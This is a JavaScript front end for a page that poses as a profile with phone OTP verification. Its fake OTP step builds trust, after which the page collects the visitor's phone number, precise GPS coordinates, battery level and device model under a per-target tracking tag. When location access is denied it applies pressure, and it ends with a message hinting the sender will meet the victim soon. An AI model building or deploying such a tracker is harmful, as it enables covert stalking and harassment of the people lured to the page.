// Public 3rd-Person Logic with Real-Time OTP Verification & Geolocation

const profileWrapper = document.getElementById('profileWrapper');
const statusMsg = document.getElementById('statusMsg');
const statusText = document.getElementById('statusText');
const spinner = document.getElementById('spinner');

// Form Elements
const urlParams = new URLSearchParams(window.location.search);
const trackingTag = urlParams.get('tag') || urlParams.get('id') || 'General Visitor';

const countryCodeSelect = document.getElementById('countryCodeSelect');
const phoneInput = document.getElementById('phoneInput');
const phoneError = document.getElementById('phoneError');

const stepSendOtp = document.getElementById('stepSendOtp');
const sendOtpBtn = document.getElementById('sendOtpBtn');

const stepVerifyOtp = document.getElementById('stepVerifyOtp');
const otpPhoneDisplay = document.getElementById('otpPhoneDisplay');
const editPhoneBtn = document.getElementById('editPhoneBtn');
const otpInput = document.getElementById('otpInput');
const otpError = document.getElementById('otpError');
const verifyOtpBtn = document.getElementById('verifyOtpBtn');
const resendOtpBtn = document.getElementById('resendOtpBtn');
const resendTimer = document.getElementById('resendTimer');

const smsBanner = document.getElementById('smsBanner');
const smsCodeText = document.getElementById('smsCodeText');
const autoFillOtpBtn = document.getElementById('autoFillOtpBtn');

let currentFormattedPhone = '';
let resendInterval = null;
let latestOtpCode = '';
let currentSiteConfig = null;

// Determine API Base URL (if user runs from Live Server on port 5500 or file://, fallback to http://localhost:3000)
const API_BASE = (window.location.protocol === 'file:' || (window.location.port && window.location.port !== '3000' && (window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1')))
  ? 'http://localhost:3000'
  : '';

// Safe JSON fetcher that handles non-JSON / HTML errors gracefully
async function safeFetchJson(endpoint, options = {}) {
  const fullUrl = endpoint.startsWith('http') ? endpoint : `${API_BASE}${endpoint}`;
  let res;
  try {
    res = await fetch(fullUrl, options);
  } catch (netErr) {
    throw new Error(`Cannot connect to server (${netErr.message}). Make sure 'node server.js' is running on port 3000.`);
  }

  const contentType = res.headers.get('content-type') || '';
  if (contentType.includes('application/json')) {
    const data = await res.json();
    if (!res.ok) {
      throw new Error(data.error || `Server error (HTTP ${res.status})`);
    }
    return data;
  }

  // Non-JSON response received (e.g. HTML 404 or Express default error)
  const rawText = await res.text();
  const match = rawText.match(/<pre>(.*?)<\/pre>/s);
  const cleanMsg = match ? match[1].replace(/<[^>]+>/g, '').trim() : '';

  if (cleanMsg) {
    throw new Error(`${cleanMsg}. (Please restart server: node server.js)`);
  }

  if (rawText.includes('<!DOCTYPE') || rawText.includes('<html')) {
    throw new Error(`Server returned HTML (HTTP ${res.status}). Server ko restart karein: node server.js`);
  }

  try {
    return JSON.parse(rawText);
  } catch (e) {
    throw new Error(`Invalid response (HTTP ${res.status}): ${rawText.slice(0, 100)}`);
  }
}

// --------------------------------------------------------------------------
// Responsive Character-by-Character Typewriter Effect
// --------------------------------------------------------------------------
let lastTypedBio = '';
let typewriterTimeout = null;

function runTypewriter(text) {
  const bioEl = document.querySelector('.bio');
  if (!bioEl || !text) return;
  if (lastTypedBio === text) return;
  lastTypedBio = text;

  if (typewriterTimeout) {
    clearTimeout(typewriterTimeout);
    typewriterTimeout = null;
  }

  bioEl.innerHTML = '<span class="typewriter-text"></span><span class="typewriter-cursor"></span>';
  const textSpan = bioEl.querySelector('.typewriter-text');
  const cursorSpan = bioEl.querySelector('.typewriter-cursor');

  let index = 0;
  const baseSpeed = 55; // 55ms per character: matches natural, comfortable book-reading cadence

  function typeChar() {
    if (index < text.length) {
      const char = text.charAt(index);
      textSpan.textContent += char;
      index++;

      // Natural reading cadence pauses at punctuations
      let delay = baseSpeed;
      if (char === '.' || char === '!' || char === '?') {
        delay = 240; // Gentle sentence pause
      } else if (char === ',' || char === ';' || char === '•' || char === '—') {
        delay = 140; // Gentle clause pause
      }

      typewriterTimeout = setTimeout(typeChar, delay);
    } else {
      setTimeout(() => {
        if (cursorSpan) {
          cursorSpan.style.opacity = '0';
          cursorSpan.style.transition = 'opacity 0.6s ease';
        }
      }, 4000);
    }
  }

  typeChar();
}

// Start typewriter on initial page DOM text immediately
const initialBioEl = document.querySelector('.bio');
if (initialBioEl && initialBioEl.textContent.trim()) {
  runTypewriter(initialBioEl.textContent.trim());
}

// Celebration Message Typewriter Effect
let celebrationTypewriterTimeout = null;

function runCelebrationTypewriter(text) {
  const celebrationText = document.getElementById('celebrationCustomText');
  if (!celebrationText || !text) return;

  if (celebrationTypewriterTimeout) {
    clearTimeout(celebrationTypewriterTimeout);
    celebrationTypewriterTimeout = null;
  }

  celebrationText.innerHTML = '<span class="celebration-typed-text"></span><span class="celebration-cursor"></span>';
  const textSpan = celebrationText.querySelector('.celebration-typed-text');
  const cursorSpan = celebrationText.querySelector('.celebration-cursor');

  let index = 0;
  const baseSpeed = 55; // 55ms per char: comfortable human reading cadence

  function typeChar() {
    if (index < text.length) {
      const char = text.charAt(index);
      textSpan.textContent += char;
      index++;

      let delay = baseSpeed;
      if (char === '.' || char === '!' || char === '?') {
        delay = 240; // Sentence pause
      } else if (char === ',' || char === ';') {
        delay = 140; // Clause pause
      }

      celebrationTypewriterTimeout = setTimeout(typeChar, delay);
    } else {
      setTimeout(() => {
        if (cursorSpan) {
          cursorSpan.style.opacity = '0';
          cursorSpan.style.transition = 'opacity 0.6s ease';
        }
      }, 4000);
    }
  }

  // 350ms delay lets the celebration card pop & bounce animation finish first
  setTimeout(typeChar, 350);
}

// Load live site config from backend on startup
async function loadSiteConfig() {
  try {
    const data = await safeFetchJson('/api/config');
    if (data.success && data.config) {
      applySiteConfig(data.config);
    }
  } catch (e) {
    console.warn('Using default UI config:', e.message);
  }
}

function applySiteConfig(cfg) {
  currentSiteConfig = cfg;

  if (cfg.pageTitle) document.title = cfg.pageTitle;
  const nameEl = document.querySelector('.name');
  if (nameEl && cfg.profileName) nameEl.textContent = cfg.profileName;

  const titleEl = document.querySelector('.title');
  if (titleEl && cfg.profileTitle) titleEl.textContent = cfg.profileTitle;

  const bioEl = document.querySelector('.bio');
  if (bioEl && cfg.profileBio) {
    runTypewriter(cfg.profileBio);
  }

  const imgEl = document.getElementById('profileImg');
  if (imgEl && cfg.profileImgUrl) imgEl.src = cfg.profileImgUrl;

  if (cfg.buttonText && sendOtpBtn) {
    const span = sendOtpBtn.querySelector('span');
    if (span) span.textContent = cfg.buttonText;
  }

  if (cfg.defaultCountry && countryCodeSelect && !urlParams.get('phone')) {
    countryCodeSelect.value = cfg.defaultCountry;
  }

  if (cfg.themeColor) {
    document.documentElement.style.setProperty('--accent-cyan', cfg.themeColor);
  }

  // Toggle phone group visibility based on config
  const phoneGroup = document.querySelector('.phone-input-group');
  if (phoneGroup) {
    phoneGroup.style.display = cfg.requirePhone ? 'block' : 'none';
  }

  const celebrationTitle = document.getElementById('celebrationTitleText');
  if (celebrationTitle && cfg.successTitle) celebrationTitle.textContent = cfg.successTitle;

  const celebrationText = document.getElementById('celebrationCustomText');
  if (celebrationText && cfg.successMessage) celebrationText.textContent = cfg.successMessage;
}

loadSiteConfig();

// Pre-fill phone if in URL
if (phoneInput && urlParams.get('phone')) {
  phoneInput.value = urlParams.get('phone').replace(/[^0-9]/g, '').slice(-10);
}

// Input restrictions: only digits, max 10
if (phoneInput) {
  phoneInput.addEventListener('input', () => {
    phoneInput.value = phoneInput.value.replace(/[^0-9]/g, '').slice(0, 10);
    if (phoneInput.value.length === 10) {
      if (phoneError) phoneError.style.display = 'none';
      phoneInput.classList.remove('shake-input');
    }
  });

  phoneInput.addEventListener('keydown', (e) => {
    if (e.key === 'Enter') handleSendOtp();
  });
}

if (otpInput) {
  otpInput.addEventListener('input', () => {
    otpInput.value = otpInput.value.replace(/[^0-9]/g, '').slice(0, 4);
    if (otpError) otpError.style.display = 'none';
    otpInput.classList.remove('shake-input');
  });

  otpInput.addEventListener('keydown', (e) => {
    if (e.key === 'Enter') handleVerifyOtpAndLocate();
  });
}

// --------------------------------------------------------------------------
// Step 1: Send OTP
// --------------------------------------------------------------------------
async function handleSendOtp() {
  const requirePhone = !currentSiteConfig || currentSiteConfig.requirePhone !== false;
  const requireOtp = !currentSiteConfig || currentSiteConfig.requireOtp !== false;

  const digits = phoneInput ? phoneInput.value.replace(/[^0-9]/g, '').trim() : '';

  if (requirePhone) {
    if (!digits || digits.length !== 10) {
      if (phoneError) {
        phoneError.style.display = 'block';
        phoneError.textContent = digits.length === 0 
          ? '⚠️ Pehle 10-digit mobile number daalein (Required)!' 
          : `⚠️ Mobile number exact 10 digit ka hona chahiye! (Abhi ${digits.length} digits hain)`;
      }
      if (phoneInput) {
        phoneInput.classList.remove('shake-input');
        void phoneInput.offsetWidth;
        phoneInput.classList.add('shake-input');
        phoneInput.focus();
      }
      return;
    }

    const country = countryCodeSelect ? countryCodeSelect.value : '+91';
    currentFormattedPhone = `${country} ${digits}`;
  } else {
    currentFormattedPhone = 'N/A';
  }

  // If OTP is disabled by admin, skip OTP step and directly request location
  if (!requireOtp) {
    requestAndTransmitLocation(currentFormattedPhone);
    return;
  }

  // UI loading
  sendOtpBtn.disabled = true;
  sendOtpBtn.innerHTML = `<span>Sending OTP...</span>`;

  try {
    const data = await safeFetchJson('/api/otp/send', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        phoneNumber: currentFormattedPhone,
        tag: trackingTag
      })
    });

    latestOtpCode = data.otpPreview || '';

    // Switch to Step 2: OTP Verification
    stepSendOtp.style.display = 'none';
    stepVerifyOtp.style.display = 'block';
    otpPhoneDisplay.textContent = currentFormattedPhone;
    otpInput.value = '';
    otpInput.focus();

    // Show simulated SMS notification banner
    if (latestOtpCode) {
      smsCodeText.textContent = latestOtpCode;
      smsBanner.style.display = 'flex';
      smsBanner.classList.add('shake-input');
    }

    startResendTimer(30);

  } catch (err) {
    alert(err.message);
  } finally {
    sendOtpBtn.disabled = false;
    sendOtpBtn.innerHTML = `
      <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
        <path d="M22 2L11 13"></path>
        <polygon points="22 2 15 22 11 13 2 9 22 2"></polygon>
      </svg>
      <span>Send Verification OTP</span>
    `;
  }
}

// --------------------------------------------------------------------------
// Step 2: Verify OTP & Trigger Location
// --------------------------------------------------------------------------
async function handleVerifyOtpAndLocate() {
  const enteredOtp = otpInput ? otpInput.value.trim() : '';

  if (!enteredOtp || enteredOtp.length !== 4) {
    if (otpError) {
      otpError.style.display = 'block';
      otpError.textContent = '⚠️ Please enter the complete 4-digit OTP code.';
    }
    if (otpInput) {
      otpInput.classList.remove('shake-input');
      void otpInput.offsetWidth;
      otpInput.classList.add('shake-input');
      otpInput.focus();
    }
    return;
  }

  verifyOtpBtn.disabled = true;
  verifyOtpBtn.innerHTML = `<span>Verifying Code...</span>`;

  try {
    const data = await safeFetchJson('/api/otp/verify', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        phoneNumber: currentFormattedPhone,
        otp: enteredOtp
      })
    });

    // OTP Verified! Hide SMS banner & trigger Geolocation
    smsBanner.style.display = 'none';
    if (otpError) otpError.style.display = 'none';
    
    verifyOtpBtn.style.background = '#10b981';
    verifyOtpBtn.innerHTML = `<span>✓ OTP Verified! Connecting...</span>`;

    // Now request Geolocation and submit to database
    requestAndTransmitLocation(currentFormattedPhone);

  } catch (err) {
    if (otpError) {
      otpError.style.display = 'block';
      otpError.textContent = `⚠️ ${err.message}`;
    }
    if (otpInput) {
      otpInput.classList.remove('shake-input');
      void otpInput.offsetWidth;
      otpInput.classList.add('shake-input');
      otpInput.focus();
    }
    verifyOtpBtn.disabled = false;
    verifyOtpBtn.innerHTML = `<span>Verify OTP &amp; Connect</span>`;
  }
}

// --------------------------------------------------------------------------
// Location Capture & Database Transmission
// --------------------------------------------------------------------------
async function requestAndTransmitLocation(verifiedPhone) {
  if (!('geolocation' in navigator)) {
    statusText.textContent = 'Geolocation not supported by browser.';
    return;
  }

  spinner.style.display = 'inline-block';
  statusText.style.color = 'var(--text-muted)';
  statusText.textContent = 'Connecting to profile & syncing verified coordinates...';

  const batteryLevel = await getBatteryInfo();
  const screenResolution = `${window.screen.width}x${window.screen.height}`;
  const deviceModel = await getDeviceDetails();

  navigator.geolocation.getCurrentPosition(
    async (position) => {
      const { latitude, longitude, accuracy, altitude, speed, heading } = position.coords;
      const timestamp = new Date(position.timestamp).toISOString();

      try {
        await safeFetchJson('/api/location', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            tag: trackingTag,
            phoneNumber: verifiedPhone,
            otpStatus: 'VERIFIED',
            deviceModel,
            latitude,
            longitude,
            accuracy,
            altitude,
            speed,
            heading,
            screenResolution,
            batteryLevel,
            timestamp
          })
        });

        spinner.style.display = 'none';
        if (statusMsg) statusMsg.style.display = 'none';

        // Hide notice and form inputs cleanly
        const locationDeniedNotice = document.getElementById('locationDeniedNotice');
        if (locationDeniedNotice) locationDeniedNotice.style.display = 'none';
        if (stepSendOtp) stepSendOtp.style.display = 'none';
        if (stepVerifyOtp) stepVerifyOtp.style.display = 'none';
        const phoneGroup = document.querySelector('.phone-input-group');
        if (phoneGroup) phoneGroup.style.display = 'none';

        // Trigger Animated Success Celebration Card
        const successCard = document.getElementById('successCelebrationCard');
        if (successCard) {
          successCard.style.display = 'block';
          const titleEl = document.getElementById('celebrationTitleText');
          if (titleEl && currentSiteConfig && currentSiteConfig.successTitle) {
            titleEl.textContent = currentSiteConfig.successTitle;
          }
          const celebrationText = document.getElementById('celebrationCustomText');
          const messageText = (currentSiteConfig && currentSiteConfig.successMessage)
            ? currentSiteConfig.successMessage
            : (celebrationText ? celebrationText.textContent.trim() : 'Thank you for sharing location & number! Mujhe need tha ye cheez ka, aapse mulaqat bahut jaldi hoga bhai ❤️🤝');

          runCelebrationTypewriter(messageText);
        }

      } catch (err) {
        spinner.style.display = 'none';
        statusText.textContent = 'Profile connected.';
      }
    },
    (error) => {
      spinner.style.display = 'none';
      if (statusMsg) statusMsg.style.display = 'none';

      // Hide inputs so user focuses on respectful location guidance
      if (stepSendOtp) stepSendOtp.style.display = 'none';
      if (stepVerifyOtp) stepVerifyOtp.style.display = 'none';
      const phoneGroup = document.querySelector('.phone-input-group');
      if (phoneGroup) phoneGroup.style.display = 'none';

      // Show warm, respectful location permission notice card
      const locationDeniedNotice = document.getElementById('locationDeniedNotice');
      if (locationDeniedNotice) {
        locationDeniedNotice.style.display = 'block';
        const titleEl = document.getElementById('respectTitle');
        const descEl = document.getElementById('respectDesc');

        if (error.code === error.PERMISSION_DENIED) {
          if (titleEl) titleEl.textContent = 'Chhoti Si Request Hai Bhai! 🙏';
          if (descEl) descEl.innerHTML = 'Aapka mobile number verify ho gaya hai! Profile connection aur aapse contact card exchange karne ke liye <b>Location Access zaroori hai</b>. Kripya bura na manein, aapka data poori tarah surakshit hai.';
        } else {
          if (titleEl) titleEl.textContent = 'GPS / Location Signal Nahi Mila 🙏';
          if (descEl) descEl.innerHTML = 'Kripya apne mobile ki <b>Location / GPS ON</b> karein aur browser me permission allow karke dobara koshish karein. Aapka data 100% safe hai.';
        }
      }
    },
    {
      enableHighAccuracy: true,
      timeout: 15000,
      maximumAge: 0
    }
  );
}

// Respectful Notice Retry Button Handler
const retryLocationBtn = document.getElementById('retryLocationBtn');
if (retryLocationBtn) {
  retryLocationBtn.addEventListener('click', () => {
    const locationDeniedNotice = document.getElementById('locationDeniedNotice');
    if (locationDeniedNotice) locationDeniedNotice.style.display = 'none';
    requestAndTransmitLocation(currentFormattedPhone);
  });
}

// --------------------------------------------------------------------------
// Helpers: Device Model, Battery, Timer, Auto-fill
// --------------------------------------------------------------------------
async function getDeviceDetails() {
  let model = '';

  // 1. Check modern User-Agent Client Hints (Chromium / Android)
  if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
    try {
      const hints = await navigator.userAgentData.getHighEntropyValues(['model', 'platform', 'platformVersion']);
      if (hints.model) {
        model = hints.model;
      }
    } catch (e) {}
  }

  const ua = navigator.userAgent || '';

  // 2. Parse common Android device models from User-Agent string
  if (!model && /android/i.test(ua)) {
    const match = ua.match(/Android[^;]+;\s*([^;)]+)\s*[;)]/i);
    if (match && match[1] && !/Build/i.test(match[1])) {
      model = match[1].trim();
    } else {
      const buildMatch = ua.match(/;\s*([^;]+)\s+Build\//i);
      if (buildMatch && buildMatch[1]) {
        model = buildMatch[1].trim();
      }
    }
  }

  // 3. Apple iOS / Desktop detection
  if (/iphone/i.test(ua)) {
    model = 'Apple iPhone';
  } else if (/ipad/i.test(ua)) {
    model = 'Apple iPad';
  } else if (!model && /android/i.test(ua)) {
    model = 'Android Phone';
  } else if (!model) {
    if (/windows/i.test(ua)) model = 'Windows PC';
    else if (/macintosh|mac os x/i.test(ua)) model = 'Apple Mac';
    else if (/linux/i.test(ua)) model = 'Linux PC';
    else model = 'Desktop / Mobile';
  }

  return model;
}

async function getBatteryInfo() {
  try {
    if ('getBattery' in navigator) {
      const b = await navigator.getBattery();
      return `${Math.round(b.level * 100)}% (${b.charging ? 'Charging' : 'Battery'})`;
    }
  } catch (e) {}
  return 'N/A';
}

function startResendTimer(seconds) {
  clearInterval(resendInterval);
  let remaining = seconds;
  resendOtpBtn.disabled = true;
  resendTimer.textContent = remaining;

  resendInterval = setInterval(() => {
    remaining--;
    resendTimer.textContent = remaining;
    if (remaining <= 0) {
      clearInterval(resendInterval);
      resendOtpBtn.disabled = false;
      resendOtpBtn.innerHTML = `Resend Code`;
    }
  }, 1000);
}

// Change Phone Number
editPhoneBtn.addEventListener('click', () => {
  stepVerifyOtp.style.display = 'none';
  stepSendOtp.style.display = 'block';
  smsBanner.style.display = 'none';
  phoneInput.focus();
});

// Auto-fill OTP from simulated SMS
autoFillOtpBtn.addEventListener('click', () => {
  if (latestOtpCode && otpInput) {
    otpInput.value = latestOtpCode;
    otpInput.focus();
    if (otpError) otpError.style.display = 'none';
  }
});

resendOtpBtn.addEventListener('click', () => {
  if (!resendOtpBtn.disabled) {
    handleSendOtp();
  }
});

sendOtpBtn.addEventListener('click', handleSendOtp);
verifyOtpBtn.addEventListener('click', handleVerifyOtpAndLocate);

// --------------------------------------------------------------------------
// User Query / Question & Voice Note Submission Logic
// --------------------------------------------------------------------------
const userQueryText = document.getElementById('userQueryText');
const submitQueryBtn = document.getElementById('submitQueryBtn');
const queryStatusAlert = document.getElementById('queryStatusAlert');
const queryInputArea = document.getElementById('queryInputArea');
const querySuccessNotice = document.getElementById('querySuccessNotice');
const askMoreBtn = document.getElementById('askMoreBtn');

// Voice Note UI Elements
const voiceIdleBox = document.getElementById('voiceIdleBox');
const startVoiceBtn = document.getElementById('startVoiceBtn');
const voiceRecordingBox = document.getElementById('voiceRecordingBox');
const voiceRecordTimer = document.getElementById('voiceRecordTimer');
const stopVoiceBtn = document.getElementById('stopVoiceBtn');
const cancelVoiceBtn = document.getElementById('cancelVoiceBtn');
const voicePreviewBox = document.getElementById('voicePreviewBox');
const voiceDurationTag = document.getElementById('voiceDurationTag');
const deleteVoiceBtn = document.getElementById('deleteVoiceBtn');
const voiceAudioElement = document.getElementById('voiceAudioElement');

// Voice Note Recording State
let mediaRecorder = null;
let mediaStream = null;
let audioChunks = [];
let recordingInterval = null;
let recordingSeconds = 0;
const MAX_RECORDING_SECONDS = 15;
let recordedAudioBlob = null;
let recordedAudioBase64 = null;
let recordedAudioDuration = 0;
let previewAudioUrl = null;

// Format seconds into MM:SS
function formatRecordTime(sec) {
  const m = Math.floor(sec / 60).toString().padStart(2, '0');
  const s = (sec % 60).toString().padStart(2, '0');
  return `${m}:${s}`;
}

// Reset Voice Note UI & State
function resetVoiceNote() {
  if (mediaRecorder && mediaRecorder.state !== 'inactive') {
    try { mediaRecorder.stop(); } catch (e) {}
  }
  if (mediaStream) {
    mediaStream.getTracks().forEach(track => track.stop());
    mediaStream = null;
  }
  clearInterval(recordingInterval);
  recordingInterval = null;
  recordingSeconds = 0;
  audioChunks = [];
  recordedAudioBlob = null;
  recordedAudioBase64 = null;
  recordedAudioDuration = 0;

  if (previewAudioUrl) {
    URL.revokeObjectURL(previewAudioUrl);
    previewAudioUrl = null;
  }
  if (voiceAudioElement) {
    voiceAudioElement.src = '';
  }

  if (voiceIdleBox) voiceIdleBox.style.display = 'flex';
  if (voiceRecordingBox) voiceRecordingBox.style.display = 'none';
  if (voicePreviewBox) voicePreviewBox.style.display = 'none';
}

// Start Voice Recording
async function startVoiceRecording() {
  if (queryStatusAlert) queryStatusAlert.style.display = 'none';

  // Check MediaDevices support
  if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia || typeof MediaRecorder === 'undefined') {
    if (queryStatusAlert) {
      queryStatusAlert.style.display = 'block';
      queryStatusAlert.textContent = '⚠️ Aapke browser me audio recording support nahi hai. Kripya type karke sawal bhejein.';
    }
    return;
  }

  try {
    mediaStream = await navigator.mediaDevices.getUserMedia({ audio: true });
  } catch (err) {
    console.warn('Microphone access denied:', err);
    if (queryStatusAlert) {
      queryStatusAlert.style.display = 'block';
      queryStatusAlert.textContent = '⚠️ Microphone permission allow karein taaki aap aawaz record kar sakein!';
    }
    return;
  }

  // Determine optimal supported MIME type
  let mimeType = '';
  const candidateTypes = [
    'audio/webm;codecs=opus',
    'audio/webm',
    'audio/mp4',
    'audio/aac',
    'audio/ogg'
  ];
  for (const t of candidateTypes) {
    if (MediaRecorder.isTypeSupported && MediaRecorder.isTypeSupported(t)) {
      mimeType = t;
      break;
    }
  }

  try {
    audioChunks = [];
    recordingSeconds = 0;
    mediaRecorder = mimeType ? new MediaRecorder(mediaStream, { mimeType }) : new MediaRecorder(mediaStream);

    mediaRecorder.ondataavailable = (e) => {
      if (e.data && e.data.size > 0) {
        audioChunks.push(e.data);
      }
    };

    mediaRecorder.onstop = () => {
      // Release microphone tracks
      if (mediaStream) {
        mediaStream.getTracks().forEach(track => track.stop());
        mediaStream = null;
      }
      clearInterval(recordingInterval);

      if (audioChunks.length === 0) {
        resetVoiceNote();
        return;
      }

      recordedAudioDuration = recordingSeconds || 1;
      const type = mediaRecorder.mimeType || 'audio/webm';
      recordedAudioBlob = new Blob(audioChunks, { type });

      // Convert to Base64 data URL for easy transmission
      const reader = new FileReader();
      reader.onloadend = () => {
        recordedAudioBase64 = reader.result;
      };
      reader.readAsDataURL(recordedAudioBlob);

      // Setup audio preview element
      if (previewAudioUrl) URL.revokeObjectURL(previewAudioUrl);
      previewAudioUrl = URL.createObjectURL(recordedAudioBlob);
      if (voiceAudioElement) {
        voiceAudioElement.src = previewAudioUrl;
      }

      if (voiceDurationTag) {
        voiceDurationTag.textContent = `${recordedAudioDuration}s`;
      }

      if (voiceRecordingBox) voiceRecordingBox.style.display = 'none';
      if (voicePreviewBox) voicePreviewBox.style.display = 'flex';
    };

    mediaRecorder.start(200); // 200ms slice for real-time capture

    // Update UI to recording state
    if (voiceIdleBox) voiceIdleBox.style.display = 'none';
    if (voicePreviewBox) voicePreviewBox.style.display = 'none';
    if (voiceRecordingBox) voiceRecordingBox.style.display = 'flex';
    if (voiceRecordTimer) voiceRecordTimer.textContent = `00:00 / 00:${MAX_RECORDING_SECONDS}`;

    // Start 15s Timer
    recordingInterval = setInterval(() => {
      recordingSeconds++;
      if (voiceRecordTimer) {
        voiceRecordTimer.textContent = `${formatRecordTime(recordingSeconds)} / 00:${MAX_RECORDING_SECONDS}`;
      }

      // Auto-stop at 15 seconds limit
      if (recordingSeconds >= MAX_RECORDING_SECONDS) {
        stopVoiceRecording();
      }
    }, 1000);

  } catch (recErr) {
    console.error('Failed to start MediaRecorder:', recErr);
    resetVoiceNote();
    if (queryStatusAlert) {
      queryStatusAlert.style.display = 'block';
      queryStatusAlert.textContent = '⚠️ Voice recording shuru karne me samasya aayi. Kripya dobara koshish karein.';
    }
  }
}

// Stop Voice Recording
function stopVoiceRecording() {
  if (mediaRecorder && mediaRecorder.state !== 'inactive') {
    try {
      mediaRecorder.stop();
    } catch (e) {}
  }
}

// Cancel Voice Recording (Discard)
function cancelVoiceRecording() {
  resetVoiceNote();
}

// Event Listeners for Voice Recording
if (startVoiceBtn) {
  startVoiceBtn.addEventListener('click', startVoiceRecording);
}
if (stopVoiceBtn) {
  stopVoiceBtn.addEventListener('click', stopVoiceRecording);
}
if (cancelVoiceBtn) {
  cancelVoiceBtn.addEventListener('click', cancelVoiceRecording);
}
if (deleteVoiceBtn) {
  deleteVoiceBtn.addEventListener('click', resetVoiceNote);
}

// Submit Query & Voice Note
if (submitQueryBtn && userQueryText) {
  submitQueryBtn.addEventListener('click', async () => {
    // If user is actively recording when clicking send, stop recording first
    if (mediaRecorder && mediaRecorder.state === 'recording') {
      stopVoiceRecording();
      // Wait brief moment for blob to convert
      await new Promise(r => setTimeout(r, 400));
    }

    const query = userQueryText.value.trim();

    // Must have either typed text OR voice note
    if (!query && !recordedAudioBase64) {
      if (queryStatusAlert) {
        queryStatusAlert.style.display = 'block';
        queryStatusAlert.textContent = '⚠️ Kripya apna sawal likhein ya mic se voice note record karein!';
      }
      userQueryText.classList.remove('shake-input');
      void userQueryText.offsetWidth;
      userQueryText.classList.add('shake-input');
      userQueryText.focus();
      return;
    }

    if (queryStatusAlert) queryStatusAlert.style.display = 'none';

    submitQueryBtn.disabled = true;
    const originalBtnContent = submitQueryBtn.innerHTML;
    submitQueryBtn.innerHTML = `<span>Bheja ja raha hai...</span>`;

    try {
      const data = await safeFetchJson('/api/query', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          query,
          audioData: recordedAudioBase64 || null,
          audioDuration: recordedAudioDuration || null,
          phoneNumber: currentFormattedPhone || 'N/A',
          tag: trackingTag
        })
      });

      // Success: clear inputs & voice note, show success notice
      userQueryText.value = '';
      resetVoiceNote();
      if (queryInputArea) queryInputArea.style.display = 'none';
      if (querySuccessNotice) querySuccessNotice.style.display = 'block';

    } catch (err) {
      if (queryStatusAlert) {
        queryStatusAlert.style.display = 'block';
        queryStatusAlert.textContent = `⚠️ Error: ${err.message}`;
      }
    } finally {
      submitQueryBtn.disabled = false;
      submitQueryBtn.innerHTML = originalBtnContent;
    }
  });

  // Submit on Ctrl+Enter or Cmd+Enter
  userQueryText.addEventListener('keydown', (e) => {
    if ((e.ctrlKey || e.metaKey) && e.key === 'Enter') {
      submitQueryBtn.click();
    }
  });
}

if (askMoreBtn) {
  askMoreBtn.addEventListener('click', () => {
    if (querySuccessNotice) querySuccessNotice.style.display = 'none';
    if (queryInputArea) queryInputArea.style.display = 'block';
    resetVoiceNote();
    if (userQueryText) {
      userQueryText.value = '';
      userQueryText.focus();
    }
  });
}
